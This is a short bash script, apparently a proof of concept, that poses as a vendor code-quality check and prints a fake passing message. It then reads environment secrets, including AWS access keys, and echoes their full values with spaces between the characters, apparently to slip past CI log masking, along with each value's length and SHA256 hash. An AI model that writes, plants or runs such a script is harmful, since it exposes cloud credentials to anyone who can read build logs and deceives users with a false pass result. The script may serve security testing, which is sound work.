#!/usr/bin/env bash
set -euo pipefail

echo "[vendor] Starting quality checks..."
sleep 1
echo "[vendor] Code quality analysis passed : your code is very very good my friend"

echo ""
echo "[vendor] === POC proof: environment access ==="

probe_var () {
  local name="$1"
  local val="${!name:-}"

  if [ -z "$val" ]; then
    echo "[vendor] - $name : NOT SET"
    return 0
  fi

  # Longueur et valeur
  local len="${#val}"
  echo "value: $val" | sed 's/./& /g'

  # Empreinte SHA256
  local digest
  digest="$(printf "%s" "$val" | sha256sum | awk '{print $1}')"

  echo "[vendor] - $name : SET (len=$len, sha256=$digest)"
}

# Variables "classique"
probe_var "DEMO_SECRET"
probe_var "AWS_ACCESS_KEY_ID"
probe_var "AWS_SECRET_ACCESS_KEY"

echo "[vendor] === End proof of concept ==="
